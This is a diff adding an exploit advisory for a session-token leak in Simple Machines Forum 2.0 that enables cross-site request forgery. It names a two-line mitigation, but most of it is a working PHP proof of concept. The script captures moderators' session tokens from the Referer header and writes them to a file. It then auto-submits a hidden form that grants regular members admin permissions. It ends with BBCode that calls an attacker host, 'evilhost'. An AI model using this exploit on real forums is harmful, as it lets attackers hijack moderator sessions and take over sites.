@@ -1,0 +1,44 @@
+Simple Machines forum (SMF) 2.0 session hijacking
+Found by The X-C3LL and seth 
+http://0verl0ad.blogspot.com/ || http://xd-blog.com.ar/
+2011-08-06
+Website: http://www.simplemachines.org/
+Greets: yoyahack, eddyw, www.portalhacker.net
+
+SMF stops csrf attacks sending a session token in all the requests wich make changes to the forum. 
+Usually, it goes in the POST content but when navigating the moderation zone it's present in the url (you need to click the links from inside that zone!). In some places, an attacker can use bbcode to insert a <img> tag, forcing the browser to make a request and leak the token in the referer header.
+There are two ways for an attacker to place a image:
+-Writing in the moderators chat (?action=moderate), requires being a moderator.
+-Making a post and reporting it to the moderator (it will be send to all the section mods and the global mods, who will see it in ?action=moderate;area=reports)
+
+Removing lines 104 and 105 from Subs-Menu.php seems to solve the problem and nothing stops working (!):
+/////////////////////////////////////////////////////
+	if (empty($menuOptions['disable_url_session_check']))
+		$menu_context['extra_parameters'] .= ';' . $context['session_var'] . '=' . $context['session_id']; 
+/////////////////////////////////////////////////////
+
+PoC exploit wich gives admin privileges to the regular members:
+/////////////////////////////////////////////////////
+<?PHP
+error_reporting(0);
+if($_GET[1]){ //Show the image
+  file_put_contents('.htoken', $_SERVER['HTTP_REFERER']); //we only save the last token because we are lazy
+  header('Content-Type: image/jpeg');
+  readfile('clickme.jpg'); //put a image here
+}else{ //Redirect to the admin panel
+  $file = explode(';', file_get_contents('.htoken'));
+  $file = explode('=', $file[2]);
+  $token = '<input type="hidden" name="' . htmlentities($file[0], ENT_QUOTES) . '" value="' . htmlentities($file[1], ENT_QUOTES) . '" />';
+  ?>
+    <html><head></head><body>
+      <form action="http://localhost/smf/index.php?action=admin;area=permissions;sa=modify2;group=0;pid=0" method="post">
+	<input type="hidden" name="group_select_view_basic_info" value="on" /><input type="hidden" name="perm[membergroup][view_stats]" value="on" /><input type="hidden" name="perm[membergroup][view_mlist]" value="on" /><input type="hidden" name="perm[membergroup][who_view]" value="on" /><input type="hidden" name="perm[membergroup][search_posts]" value="on" /><input type="hidden" name="perm[membergroup][calendar_view]" value="on" /><input type="hidden" name="perm[membergroup][profile_view_own]" value="on" /><input type="hidden" name="perm[membergroup][profile_view_any]" value="on" /><input type="hidden" name="group_select_moderate_general" value="on" /><input type="hidden" name="perm[membergroup][karma_edit]" value="on" /><input type="hidden" name="perm[membergroup][calendar_edit_any]" value="off" /><input type="hidden" name="perm[membergroup][access_mod_center]" value="on" /><input type="hidden" name="perm[membergroup][moderate_forum]" value="on" /><input type="hidden" name="perm[membergroup][issue_warning]" value="off" /><input type="hidden" name="perm[membergroup][profile_identity_any]" value="on" /><input type="hidden" name="perm[membergroup][profile_extra_any]" value="on" /><input type="hidden" name="perm[membergroup][profile_title_any]" value="on" /><input type="hidden" name="perm[membergroup][profile_remove_any]" value="on" /><input type="hidden" name="group_select_use_pm_system" value="on" /><input type="hidden" name="perm[membergroup][pm_read]" value="on" /><input type="hidden" name="perm[membergroup][pm_send]" value="on" /><input type="hidden" name="perm[membergroup][calendar_post]" value="off" /><input type="hidden" name="perm[membergroup][calendar_edit_own]" value="off" /><input type="hidden" name="group_select_administrate" value="on" /><input type="hidden" name="perm[membergroup][admin_forum]" value="on" /><input type="hidden" name="perm[membergroup][manage_boards]" value="on" /><input type="hidden" name="perm[membergroup][manage_attachments]" value="on" /><input type="hidden" name="perm[membergroup][manage_smileys]" value="on" /><input type="hidden" name="perm[membergroup][edit_news]" value="on" /><input type="hidden" name="perm[membergroup][manage_membergroups]" value="on" /><input type="hidden" name="perm[membergroup][manage_permissions]" value="on" /><input type="hidden" name="perm[membergroup][manage_bans]" value="on" /><input type="hidden" name="perm[membergroup][send_mail]" value="on" /><input type="hidden" name="group_select_edit_profile" value="on" /><input type="hidden" name="perm[membergroup][profile_identity_own]" value="on" /><input type="hidden" name="perm[membergroup][profile_extra_own]" value="on" /><input type="hidden" name="perm[membergroup][profile_title_own]" value="on" /><input type="hidden" name="group_select_delete_account" value="on" /><input type="hidden" name="perm[membergroup][profile_remove_own]" value="on" /><input type="hidden" name="group_select_use_avatar" value="on" /><input type="hidden" name="perm[membergroup][profile_server_avatar]" value="on" /><input type="hidden" name="perm[membergroup][profile_upload_avatar]" value="on" /><input type="hidden" name="perm[membergroup][profile_remote_avatar]" value="on" /><input type="hidden" name="group_select_moderate" value="on" /><input type="hidden" name="perm[board][moderate_board]" value="on" /><input type="hidden" name="perm[board][approve_posts]" value="off" /><input type="hidden" name="perm[board][merge_any]" value="on" /><input type="hidden" name="perm[board][split_any]" value="on" /><input type="hidden" name="perm[board][send_topic]" value="on" /><input type="hidden" name="perm[board][make_sticky]" value="on" /><input type="hidden" name="perm[board][move_own]" value="on" /><input type="hidden" name="perm[board][move_any]" value="on" /><input type="hidden" name="perm[board][lock_own]" value="on" /><input type="hidden" name="perm[board][lock_any]" value="on" /><input type="hidden" name="perm[board][remove_any]" value="on" /><input type="hidden" name="perm[board][modify_replies]" value="on" /><input type="hidden" name="perm[board][delete_replies]" value="on" /><input type="hidden" name="perm[board][announce_topic]" value="on" /><input type="hidden" name="perm[board][delete_any]" value="on" /><input type="hidden" name="perm[board][modify_any]" value="on" /><input type="hidden" name="perm[board][poll_add_any]" value="on" /><input type="hidden" name="perm[board][poll_edit_any]" value="on" /><input type="hidden" name="perm[board][poll_lock_own]" value="on" /><input type="hidden" name="perm[board][poll_lock_any]" value="on" /><input type="hidden" name="perm[board][poll_remove_any]" value="on" /><input type="hidden" name="group_select_make_posts" value="on" /><input type="hidden" name="perm[board][post_new]" value="on" /><input type="hidden" name="perm[board][post_reply_own]" value="on" /><input type="hidden" name="perm[board][post_reply_any]" value="on" /><input type="hidden" name="perm[board][post_unapproved_topics]" value="on" /><input type="hidden" name="perm[board][post_unapproved_replies_own]" value="on" /><input type="hidden" name="perm[board][post_unapproved_replies_any]" value="on" /><input type="hidden" name="perm[board][post_unapproved_attachments]" value="on" /><input type="hidden" name="group_select_modify" value="on" /><input type="hidden" name="perm[board][remove_own]" value="on" /><input type="hidden" name="perm[board][delete_own]" value="on" /><input type="hidden" name="perm[board][modify_own]" value="on" /><input type="hidden" name="perm[board][poll_edit_own]" value="on" /><input type="hidden" name="perm[board][poll_remove_own]" value="on" /><input type="hidden" name="group_select_participate" value="on" /><input type="hidden" name="perm[board][report_any]" value="on" /><input type="hidden" name="perm[board][poll_view]" value="on" /><input type="hidden" name="perm[board][poll_vote]" value="on" /><input type="hidden" name="perm[board][view_attachments]" value="on" /><input type="hidden" name="group_select_post_polls" value="on" /><input type="hidden" name="perm[board][poll_post]" value="on" /><input type="hidden" name="perm[board][poll_add_own]" value="on" /><input type="hidden" name="group_select_notification" value="on" /><input type="hidden" name="perm[board][mark_any_notify]" value="on" /><input type="hidden" name="perm[board][mark_notify]" value="on" /><input type="hidden" name="group_select_attach" value="on" /><input type="hidden" name="perm[board][post_attachment]=on" /> <?PHP echo $token; ?>
+      </form><script>document.forms[0].submit()</script>
+    </body></html>
+  <?
+}
+/////////////////////////////////////////////////////
+Use:
+[url=http://evilhost/exploit.php][img]http://evilhost/exploit.php?1=1[/img][/url] 
+
+
